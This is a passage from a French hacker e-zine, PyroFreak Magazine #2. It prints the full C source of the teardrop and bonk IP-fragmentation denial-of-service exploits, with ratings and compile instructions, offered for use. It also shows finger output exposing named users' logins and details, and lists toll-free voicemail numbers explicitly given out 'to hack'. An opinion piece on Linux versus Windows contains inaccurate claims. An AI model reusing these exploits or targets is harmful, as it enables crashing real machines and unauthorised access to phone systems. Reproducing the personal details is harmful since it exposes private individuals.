        tcpheader->th_sum=checksum((u_short *) &pseudoheader,12+sizeof(struct tcphdr));

        if(sendto(sock,buffer,sizeof(struct iphdr)+sizeof(struct tcphdr),0,(struct sockaddr *) &sin,sizeof(struct sockaddr_in))==-1)
        {
                fprintf(stderr,"couldn't send packet\n");
                return(-1);
        }

        fprintf(stderr,"%s:%s landed\n",argv[1],argv[2]);

        close(sock);
        return(0);
}
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯


______________________________________________________________________________________
Analyse du Script     : TearDrop.c 11.3.97
Auteur                : route|deamon9
URL de Téléchargement : http://www.technotronic.com
Note sur 10           : 8/10
Note(s) du programme  : heehe sans probleme pour la compilation !!
                        gcc -o2 teadrop.c -o teadrop
Fonction(s)           : Peut fucké n'importe quel machine 
                        Windows 3.1 - Windows 95 - Windows 98
                        Sauf si le PC est patché contre le teardrop
Commantaire(s)        : Voir Bonk.c plus loin :)        

Voici le code : 
¯¯¯¯¯¯¯¯¯¯¯¯¯ ¯
/*
 *  Copyright (c) 1997 route|daemon9  <route@infonexus.com> 11.3.97
 *
 *  Linux/NT/95 Overlap frag bug exploit
 *
 *  Exploits the overlapping IP fragment bug present in all Linux kernels and
 *  NT 4.0 / Windows 95 (others?)
 *
 *  Based off of:   flip.c by klepto
 *  Compiles on:    Linux, *BSD*
 *
 *  gcc -O2 teardrop.c -o teardrop
 *      OR
 *  gcc -O2 teardrop.c -o teardrop -DSTRANGE_BSD_BYTE_ORDERING_THING
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>

#ifdef STRANGE_BSD_BYTE_ORDERING_THING
                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */
#define FIX(n)  (n)
#else                   /* OpenBSD 2.1, all Linux */
#define FIX(n)  htons(n)
#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */

#define IP_MF   0x2000  /* More IP fragment en route */
#define IPH     0x14    /* IP header size */
#define UDPH    0x8     /* UDP header size */
#define PADDING 0x1c    /* datagram frame padding for first packet */
#define MAGIC   0x3     /* Magic Fragment Constant (tm).  Should be 2 or 3 */
#define COUNT   0x1     /* Linux dies with 1, NT is more stalwart and can
                         * withstand maybe 5 or 10 sometimes...  Experiment.
                         */
void usage(u_char *);
u_long name_resolve(u_char *);
u_short in_cksum(u_short *, int);
void send_frags(int, u_long, u_long, u_short, u_short);

int main(int argc, char **argv)
{
    int one = 1, count = 0, i, rip_sock;
    u_long  src_ip = 0, dst_ip = 0;
    u_short src_prt = 0, dst_prt = 0;
    struct in_addr addr;

    fprintf(stderr, "teardrop   route|daemon9\n\n");

    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        perror("raw socket");
        exit(1);
    }
    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))
        < 0)
    {
        perror("IP_HDRINCL");
        exit(1);
    }
    if (argc < 3) usage(argv[0]);
    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))
    {
        fprintf(stderr, "What the hell kind of IP address is that?\n");
        exit(1);
    }

    while ((i = getopt(argc, argv, "s:t:n:")) != EOF)
    {
        switch (i)
        {
            case 's':               /* source port (should be emphemeral) */
                src_prt = (u_short)atoi(optarg);
                break;
            case 't':               /* dest port (DNS, anyone?) */
                dst_prt = (u_short)atoi(optarg);
                break;
            case 'n':               /* number to send */
                count   = atoi(optarg);
                break;
            default :
                usage(argv[0]);
                break;              /* NOTREACHED */
        }
    }
    srandom((unsigned)(time((time_t)0)));
    if (!src_prt) src_prt = (random() % 0xffff);
    if (!dst_prt) dst_prt = (random() % 0xffff);
    if (!count)   count   = COUNT;

    fprintf(stderr, "Death on flaxen wings:\n");
    addr.s_addr = src_ip;
    fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);
    addr.s_addr = dst_ip;
    fprintf(stderr, "  To: %15s.%5d\n", inet_ntoa(addr), dst_prt);
    fprintf(stderr, " Amt: %5d\n", count);
    fprintf(stderr, "[ ");

    for (i = 0; i < count; i++)
    {
        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
        fprintf(stderr, "b00m ");
        usleep(500);
    }
    fprintf(stderr, "]\n");
    return (0);
}

/*
 *  Send two IP fragments with pathological offsets.  We use an implementation
 *  independent way of assembling network packets that does not rely on any of
 *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).
 */

void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
                u_short dst_prt)
{
    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */
    u_char byte;                            /* a byte */
    struct sockaddr_in sin;                 /* socket protocol structure */

    sin.sin_family      = AF_INET;
    sin.sin_port        = src_prt;
    sin.sin_addr.s_addr = dst_ip;

    /*
     * Grab some memory for our packet, align p_ptr to point at the beginning
     * of our packet, and then fill it with zeros.
     */
    packet = (u_char *)malloc(IPH + UDPH + PADDING);
    p_ptr  = packet;
    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

    byte = 0x45;                        /* IP version and header length */
    memcpy(p_ptr, &byte, sizeof(u_char));
    p_ptr += 2;                         /* IP TOS (skipped) */
    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(242);   /* IP id */
    p_ptr += 2;
    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */
    p_ptr += 2;
    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
    byte = IPPROTO_UDP;
    memcpy(p_ptr + 1, &byte, sizeof(u_char));
    p_ptr += 4;                         /* IP checksum filled in by kernel */
    *((u_long *)p_ptr) = src_ip;        /* IP source address */
    p_ptr += 4;
    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
    p_ptr += 4;
    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */

    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }

    /*  We set the fragment offset to be inside of the previous packet's
     *  payload (it overlaps inside the previous packet) but do not include
     *  enough payload to cover complete the datagram.  Just the header will
     *  do, but to crash NT/95 machines, a bit larger of packet seems to work
     *  better.
     */
    p_ptr = &packet[2];         /* IP total length is 2 bytes into the header */
    *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1);
    p_ptr += 4;                 /* IP offset is 6 bytes into the header */
    *((u_short *)p_ptr) = FIX(MAGIC);

    if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }
    free(packet);
}

u_long name_resolve(u_char *host_name)
{
    struct in_addr addr;
    struct hostent *host_ent;

    if ((addr.s_addr = inet_addr(host_name)) == -1)
    {
        if (!(host_ent = gethostbyname(host_name))) return (0);
        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
    }
    return (addr.s_addr);
}

void usage(u_char *name)
{
    fprintf(stderr,
            "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\n",
            name);
    exit(0);
}

/* EOF */
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯


___________________________________________________________________________
Analyse du Script     : Bonk.c 
Auteur                : route|deamon9 & klepto
URL de Téléchargement : http://www.technotronic.com
Note sur 10           : 7/10
Note(s) du programme  : Je n'ai pas été capable de le compiller
Fonction(s)           : Crash le patch contre le teadrop
                        Windows 3.1 - Windows 95 - Windows 98
Commantaire(s)        : Si vous trouvez ce qu'il ne marche pas avec le
                        compillateur, dites-le moi svp.

Voici le code : 
¯¯¯¯¯¯¯¯¯¯¯¯¯ ¯
/*

  [ http://www.technotronic.com.com/ ]

                                ==bendi - 1998==

                        bonk.c        -         5/01/1998
        Based On: teardrop.c by route|daemon9 & klepto
        Crashes *patched* win95/(NT?) machines.

        Basically, we set the frag offset > header length (teardrop
        reversed). There are many theories as to why this works,
        however i do not have the resources to perform extensive testing.
        I make no warranties. Use this code at your own risk.
        Rip it if you like, i've had my fun.

*/

#include <stdio.h>
#include <string.h>

#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_udp.h>
#include <netinet/protocols.h>
#include <arpa/inet.h>

#define FRG_CONST       0x3
#define PADDING         0x1c

struct udp_pkt
{
        struct iphdr    ip;
        struct udphdr   udp;
        char data[PADDING];
} pkt;

int     udplen=sizeof(struct udphdr),
        iplen=sizeof(struct iphdr),
        datalen=100,
        psize=sizeof(struct udphdr)+sizeof(struct iphdr)+PADDING,
        spf_sck;                        /* Socket */

void usage(void)
{
        fprintf(stderr, "Usage: ./bonk <src_addr> <dst_addr> [num]\n");
        exit(0);
}

u_long host_to_ip(char *host_name)
{
        static  u_long ip_bytes;
        struct hostent *res;

        res = gethostbyname(host_name);
        if (res == NULL)
                return (0);
        memcpy(&ip_bytes, res->h_addr, res->h_length);
        return (ip_bytes);
}

void quit(char *reason)
{
        perror(reason);
        close(spf_sck);
        exit(-1);
}

int fondle(int sck, u_long src_addr, u_long dst_addr, int src_prt,
           int dst_prt)
{
        int     bs;
        struct  sockaddr_in to;

        memset(&pkt, 0, psize);
                                                /* Fill in ip header */
        pkt.ip.version = 4;
        pkt.ip.ihl = 5;
        pkt.ip.tot_len = htons(udplen + iplen + PADDING);
        pkt.ip.id = htons(0x455);
        pkt.ip.ttl = 255;
        pkt.ip.protocol = IP_UDP;
        pkt.ip.saddr = src_addr;
        pkt.ip.daddr = dst_addr;
        pkt.ip.frag_off = htons(0x2000);        /* more to come */

        pkt.udp.source = htons(src_prt);        /* udp header */
        pkt.udp.dest = htons(dst_prt);
        pkt.udp.len = htons(8 + PADDING);
                                                /* send 1st frag */

        to.sin_family = AF_INET;
        to.sin_port = src_prt;
        to.sin_addr.s_addr = dst_addr;

        bs = sendto(sck, &pkt, psize, 0, (struct sockaddr *) &to,
                sizeof(struct sockaddr));

        pkt.ip.frag_off = htons(FRG_CONST + 1);         /* shinanigan */
        pkt.ip.tot_len = htons(iplen + FRG_CONST);
                                                        /* 2nd frag */

        bs = sendto(sck, &pkt, iplen + FRG_CONST + 1, 0,
                (struct sockaddr *) &to, sizeof(struct sockaddr));

        return bs;
}

void main(int argc, char *argv[])
{
        u_long  src_addr,
                dst_addr;

        int     i,
                src_prt=53,
                dst_prt=53,
                bs = 1,
                pkt_count = 10;         /* Default amount */

        if (argc < 3)
                usage();

        if (argc == 4)
                pkt_count = atoi(argv[3]);      /* 10 does the trick */

        /* Resolve hostnames */

        src_addr = host_to_ip(argv[1]);
        if (!src_addr)
                quit("bad source host");
        dst_addr = host_to_ip(argv[2]);
        if (!dst_addr)
                quit("bad target host");

        spf_sck = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (!spf_sck)
                quit("socket()");
        if (setsockopt(spf_sck, IPPROTO_IP, IP_HDRINCL, (char *) &bs,
        sizeof(bs)) < 0)
                quit("IP_HDRINCL");

        for (i = 0; i < pkt_count; ++i)
        {
                fondle(spf_sck, src_addr, dst_addr, src_prt, dst_prt);
                usleep(10000);
        }

        printf("Done.\n");
}
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯

Conclusion : Donc, voilà pour ce zine. Continuer à le lire et souvenez-vous qu'à
             chaque ezine que Pyro-Phreak mag va sortir, il va y avoir une section
             comme cella qui va vous faire part des bons programmes qu'il existe.

   					    




____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                              Finger                   
'.________  __ __ ___________ ____ ______________ ____Par [G]r4FX__ __

Le programme finger permet d'obtenir des informations sur une personne. Le 
problème de ce programme c'est qui peut être utilisé pour découvrir
des nom de login sur un ordinateur : 

finger @193.51.222.81
[msb31u01.u-3mrs.fr]

Welcome to Linux version 2.0.29 at msb31u01.u-3mrs.fr !

 11:34am  up 6 days, 17:28,  4 users,  load average: 0.29, 0.33, 0.29

Login    Name                 Tty  Idle  Login Time   Office     Office Phone
jeannejy Jeannette Jean Yves   p1     3  Mar 25 11:30 (:0.0)
paperap  Papera Pierre         p3        Mar 25 11:34 (MSB31U04.U-3MRS.)
poggij   Poggi Jerome          1         Mar 25 11:33
root     Supper User           2         Mar 25 11:33



Cette commande affiche le nom des personnes qui sont connectées sur l'ordinateur 
193.51.222.81, de plus il indique des informations tel que : le
temps d'inactivité, l'heure de login ... 

Tandis que la commande : 

finger poggij@msb31u01.u-3mrs.fr
[msb31u01.u-3mrs.fr]

Welcome to Linux version 2.0.29 at msb31u01.u-3mrs.fr !

 11:34am  up 6 days, 17:28,  4 users,  load average: 0.29, 0.33, 0.29

Login: poggij                           Name: Poggi Jerome
Directory: /home/duii2/poggij         Shell: /bin/bash
On since Tue Mar 25 11:33 (MET DST) on tty1   29 seconds idle
Mail last read Tue Mar 25 11:33 1997 (MET DST)
Plan:
                  \\_//
                  (, ,)
|-------------oOOo-(_)-oOOo---------------------------|
 Diplome Universitaire d'Ingenierie Informatique
 Faculte des Sciences et Technique d'Aix-Marseille III
 Avenue Escadrille Normandie Niemen
 13397 MARSEILLE Cedex 20
|-----------------------------------------------------|
 Home page:    http://msb31u01.u-3mrs.fr/~poggij
 E-Mail:       mailto:jerome.poggi@usa.net
|-----------------------------------------------------|



affiche des informations sur la personne tel que : 

     dernière heure de connexion 
     nom réel 
     directory de travail 
     ... 

Cette commande est très utilisé pour découvrir des informations sur les comptes 
des utilisteurs. Elle peut être remplacé par une commande safe_finger fournis 
dans le pack tcp_wrapper, qui elle ne donne que très peu d'informations. 

____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                     Encore les VMBs
'.________  __ __ ___________ ____ ______________ ____Par Neuro__ __

Voici le menu d'une VMB typique du Quebec et meme de France! Pour acceder
a ce menu, faut bien entendu avoir réussi a cracker le password!
En passant, cé pas un rip de NPC. J'ai prit ma petite enregistreuse pour 
prendre ca en note. Voici le menu en question:

Numero de tel   boite vocale
81 boite vocal#pass#

       2-Écoute
       4-Message Précédant
       6-Message suivant 
       7*------0-Modaliter d'envois
              1-Réponse
              2-Choisis de l'envelloppe
     	      3-Réacheminement
              4-Réponse diffusée
              5-Création d'un message
              6-effacement
              9-envoie
              #-Quitter ce mode

       8*-----0-Modaliter de la boite vocale
                       1-Modifier le numero d'assistance direct
                       #-Quitter ce mode
              1-Acces
              2-Message d'accueil
                       1-Message d'accueil destiner au message externe
                       2-Message d'accueil destiner au message interne
                       *-Ecouter la liste de nouveau
                       #-Quitter ce mode
              3-Sortit
              4-Mot de passe
              5-Liste de diffusion
              6-Positionnement Direct
              9-Identification personnalisée
                       4-Pour quitter
                       5-Pour enregistrer le nom dans le message personnalisé
              #-Quitter ce mode
       9-Rapel de l'expéditeur
      71-Réponse
      73-Réacheminement
      74-Réponse diffusée
      76-Effacement
       *-Plus de renseignements

A chaque zine, j'ai décider de vous donner quelques VMBs a hacker, question
de mettre la théorie en Pratique,désoler pour les Francais.

1-800-468-9510 
1-800-468-9513  
1-800-468-9515 
1-800-468-1498 
1-800-468-5270          (Scan by Psykaos)
1-800-468-5290 
1-800-468-6320 
1-800-468-6321 
1-800-468-6322 
1-800-468-6324  

 

____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                            Linux vs Windows                  
'.________  __ __ ___________ ____ ______________ ____Par endrix__ __






                       O=======================O
                      <|I n t r o d u c t i o n|>
                       O=======================O



  Bon, pourquoi j'ai écrit cet article ?? Hey bien parce que il y a 
tellement de personne qui viennent me voir sur irc pour me demander des 
questions comme celle qui suivent : 

"C'est quoi la différence entre Windows et Linux ???"
"Pourquoi tant de personne ont adopté le OS linux ???"
"Pourquoi que les logiciels de linux sont moins cher ???"
et bien d'autres ....

 Donc dans ce texte, je vais vous dire les différences entre Windows, qui
a été crée par Bill Gates et sont équipe et Linux qui a été crée au début
par un jeune pirate informatique du nom de Linus B. Torvalds, les
avantages, les désavantages.... 

 Alors, s'il y a encore une personne sur internet qui vient me voir pour me
demander ca, je vais lui dire tout simplement d'aller voir cet e-zine.




                                 O=========O
                                <|L i n u x|>
                                 O=========O


Histoire :
¯¯¯¯¯¯¯¯¯¯
 Donc, comme j'ai dit dans l'introduction, Linux a été concu au début par un
jeune pirate informatique de l'Université d'Helsinki, en finlande, Linus B. Torvalds 
qui avait 21 ans, en 1991. Il décide de construire sont système d'exploitation(OS)
parce que sont budjet d'étudiant ne lui permettait pas de pouvoir s'acheter les
logiciels sur le marché et qui étaient a l'époque, pas très fiable. Donc, en 3
mois, Linus écrit environs 10 000 lignes de code de programme et soumet sont 
travail a une dixaines de correspondants sur l'internet. Donc au fur et a mesure
que sont projet avancait, de plus en plus d'internaute-programmeur ont rejoint
l'équipe, d'environs 150, qui en 1992 ont sorti le première version du système
d'exploitation qui se nomma Linux.

 Après la sorti de cette verion, Linus recoit des quatres coins de la planète des
sources, des programmes, des suggestions, des commantaires, des contributions pour
amilioré Linux. Aprés cela, linux ce transmet de main en main, d'internaute à
internaute, maintenant des centaines de milliers de personnes ont adopté ce système
d'exploitation et le OS va connaître ca gloire et servira même a faire les trucages
dans le film Titanic. 
             ¯¯¯¯¯¯¯
 À qui faut devoir le succèss de Linux ??? Hey bien c'est a tout les utilisateurs du 
programme maintenant. Pour un teste, allez sur le cannal #hack.fr ou #phreak.fr et 
demandez conbien de personne on Linux ou encore combien de personne sont en linux 
présentement. Vous allez voir que l'utilisateur de linux est très nombreux.
Je peux dire que presque tout le monde dans ca vie qui a adopté linux a passé
par Windows. Linux est un système d'exploitation pour l'utilisateur plus avancé
du Pc.


Mais quel est le vrai avantage de Linux ??? 
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
 D'après moi, le vrai avantage de linux c'est que les sources des programmes sont à la 
porté de la main. Tout les programmes pour linux viennent avec la source. Donc, 
comparativement à Windows, tu n'as pas besoin d'aller suivre un cours de programmation
ou dépensser 60$ pour un livre de programmation. Juste avec les sources, vous pouvez très
bien apprendre. On apprend avec les exemples et les sources sont les exemples. Donc, finnit
les virus ou les trojans. Avant de compiller un programme en linux vous pouvez aller voir
s'il peut faire des daumages a votre systeme et s'il en fait, flushhhh !!!! ou vous pouvez
le modifier afin qu'il n'en fasse plus. En windows, pour savoir ce que fait un .exe déjà 
compiller et que 0.00000001% du temps la source vient avec le programme vous pouvez l'editer
mais pour cela il faudra un editeur exadécimal et il vous faudra une bonne compréension du 
language de programmation, l'assembleur. 


Interface graphique ou en texte mode ???
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
heehe, cet question je l'ai entendu très souvent. Linux vient en plusieur version et en voici
quelques une :

- Red Hat
- Debian
- Slackware

 Ces versions sont les plus connues. Linux viens avec une interface graphique et en text mode.
Umpeu comme Windows et DOS. La différence c'est que windows veut illiminer le Texte mode et que
tout soit user friendly mais linux lui garde le texte mode parce que vous ferez le test, le texte
mode est beaucoup plus rapide. Mais je peux dire que l'interface graphique de Linux est loin du 
GuI de windows. il y a plusieur facon de mettre un interface graphique en linux. Il y a litestep,
windows maker, x-windows ... Moi personnellement j'aime bien X-Windows :)


Stable ou instable ????
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯

 Ce qui fait la force de linux est que les sources sont ouvert au public mais aussi c'est 
que linux est le système d'exploitation le plus stable qu'il y a jusqu'à maintenant. C'est 
pourquoi que l'armée américaine et l'armée francaise utilise le OS linux. La moitié des 
serveurs sur l'internet sont en linux et l'autre moitié sont en Windows NT et quelques un 
en Window 95/3.1 ... Naon, en Linux il n'y a pas de BLUE SCREEN !!!!!!


Compatible ou pas ???
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯

 Ceci est le gros problème de linux et mème Apple ; la compatibilité. Maintenant il y a 
beaucoup de programme fait en linux, comme Corel WordPerfect main maintenant des versions 
en linux mais ca n'arrive pas a la cheville des programmes qui sont fait pour Windows. 
N'espéré pas pouvoir jouer à un jeux super en linux. Mais les progammes qui sont les plus 
utilisés sur l'internet ont été fait n linux comme : Netscape, ICQ, WinAMp, Corel 
Wordperfect... Et si vous aimez faire de l'infographie, vous aimerez le programme Gimp 
qui je crois a une légère avance sur Photoshop. 


Rapide ou pas ???
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
 Hey bien, Linux est beaucoup en texte mode alors il est beaucoup plus rapide mais il y 
a aussi un avantage à windows. Il utilise beaucoup moins de RAM. Linux utilise un systeme 
de swap memory qui est sur votre disque dur. De cette manière, la vitesse a été aumenté 
de beaucoup.


Facile pour utilisation ???
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
HeY bien, je trouve pas. Pour le monde qui sont abitué en linux ils aiment ca mais moi...
j'aime umpeu plus la manière de windows.

Windows [-=-]  Piton Install
Linux   [-=-]  Compillation, librairie.... pffff....




                                O=============O
                               <|W i n d o w s|>
                                O=============O


Histoire :
¯¯¯¯¯¯¯¯¯¯
Micro$oft, qui a été premièrement partie par Bill Gates(yerkk) qui a commencé ca compagnie
à l'âge de 14 ans. il a commencé à vendre ces programmes à 14... WAW !!! euhhhh.... C'est
tout ce que j'ai pu trouvé sur Bill Gates et Microsoft.... Mais je peux dire que Windows
maintenant a tellement de pouvoir, que Bill Gates commence a s'enfler la tête avec ca.
Windows, maintenant, est plus utilisé comme un outil de domination que d'autre chose. Il
est fais de manière très vite et plein de bug. Teadrop, Nuke, OOB nuke.... Tout ca sont
des "bugs" que Microsoft on pas pensé parce qu'il était trop pressé à sortir le système
d'exploitation.



Quel est le vrai avantage de Window sur linux :
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
Le vrai avantage de Windows sur Linux est ca compatibilité, ca facilité d'utilisation et 
sont supposé Plug-and-play. Ben, moi j'appele plus ca plus-and-pray ... heheehhe :) Parce 
que souvent, le plus-and-play crash.... CA veut dire, entrez votre matériel sans avoir a 
le configuré et il va marcher tout seul..... yeah right... en tk... Il faut avouer que 
c'est windows qui a partit le monde de l'informatique. Sans microsoft, nous serions encore 
à l'âge ed pierre avec des interfaces en texte ou tout le monde serait en Mac. Parce que 
en passsant, c'est Mac qui a premièrement pensé au bouton démarrer. Presque tout ce qu'on
trouve sur le web, est compatible avec Microsoft Windows. Il a été plus concu pour les 
débutants alors si vous êtes un utilisateur avancé du Pc, windows risque de vous frustrez 
plus que d'autre chose.


Interface graphique ou en texte mode ???
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
L'interface graphique de windows est très bien. Tout ce fait sans avoir a aller en dos. 
Mais, elle contient plusieurs mais plusieurs bugs.... Mais, il y a quelques fonctions que 
j'aime bien qui sont en DOS comme le nbtstat, net use, net view, tracert..... Parfois, le
dos peux très bien servir comme pour faire ca dir/s/w > dir.txt c'est dur à faire en 
windows ...


Stable ou instable ????
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
hehehehhehehe BLUE SCREEEEEEEEEEEEEEEEEEEEEEEEEEEEEENNNN !!!!!! AHHHHHHhhhhhh !!!!! explorer.exe
plante touttttttt le temps... Vive les blues screens... :) Windows est une machine a planté
mais si vous le connaissez bien, vous trouverez ce qu'il le fait planté et vous allez faire 
pour qu'il ne vous plante pu dans la face. Windows est le système d'exploitation le plus 
instable qu'il y a jusqu'à maintenant.


Rapide ou pas ???
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
Windows, d'après moi, gobe beaucoup trop de mémoire ram. Comparativement à linux, il n'utilise
pas de mémoire swap(sur le hd) alors il ne fait qu'utiliser le RAM. Juste pour vous dire, 
windows 2000 a besoin de 64meg de RAM. Mais, linux est beaucoup rapide


____ __ _ _ _______________ ________ ________ __PyroFreak Magazine #2              
:                   
|                            Conclusion                    
'.________  __ __ ___________ ____ ______________ ____Par Neuro__ __

bon cé déja la fin du #2 de pyrofreakmag . J'espere que vous avez aimer, tk.
Si vous désirer faire publier votre article dans le #3, envoyez le a
pyrofreakmag@hotmail.com , ou via IRC (#phreak.fr UNDERNET)
Site web:http://pyrofreak.cjb.net . Envoyer nous vos questions par e-mail, 
on va faire notre possible pour y répondre dans un FAQ qu'on va faire dans 
le #3. Le #3 est fixer pour environ le 1er avril. Pour commentaires
ou suggestions : pyrofreakmag@hotmail.com 
J'aimerais remercier:
Toute l'équipe de pyrofreak
Maniak d'avoir changer d'avis, j'espere qui rechangera pas a nouveau.
Darkbug, de distribuer notre zine sur son site web.
Nos supporteurs sur #phreak.fr via Undernet
Tient Nuclear une petite pub pour ton server 
/server shell.optima-dialup.com 6667   #mtl.server   (krusnet) vener nous 
voir.

@@@@@@@@@@@@@@@@@@@@Pyrofreakmag touts droits réservés@@@@@@@@@@@@@@@@@@@@@@
